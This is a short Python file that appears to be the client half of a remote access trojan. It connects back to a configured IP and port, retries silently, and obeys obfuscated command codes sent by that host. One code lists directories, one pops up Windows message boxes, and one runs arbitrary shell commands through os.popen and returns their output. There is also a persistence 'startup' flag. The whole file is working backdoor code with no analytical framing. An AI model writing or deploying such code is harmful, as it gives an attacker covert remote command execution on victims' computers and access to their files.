import socket
import os
import ast
import ctypes

s = socket.socket()

# START OF CONFIG

startup = False

ip = "127.0.0.1"
port = 8080

# END OF CONFIG

def reset():
    global s
    
    s = socket.socket()

while True:

    try:
        incoming_message = s.recv(1024)
        incoming_message = incoming_message.decode()
        incoming_message = ast.literal_eval(incoming_message)

        if(incoming_message[0] == "vfisd"):
            myDir = os.listdir(incoming_message[1])
            
            end = str(['vfisd', myDir])
            end = end.encode()

            s.send(end)

        if(incoming_message[0] == "smbwm"):
            msgBox = ctypes.windll.user32.MessageBoxW(0, incoming_message[1], incoming_message[2], 4)
            response = "Null"

            if msgBox == 6: response = "Yes"
            if msgBox == 7: response = "No"
            if msgBox == 2: response = "Cancel"

            end = str(['smbwm', response])
            end = end.encode()

            s.send(end)

        if(incoming_message[0] == "ewc"):
            result = os.popen(incoming_message[1]).read()

            end = str(['ewd', result])
            end = end.encode()

            s.send(end)
            
    except:
        try:
            s.connect((ip, port))
        except:
            reset()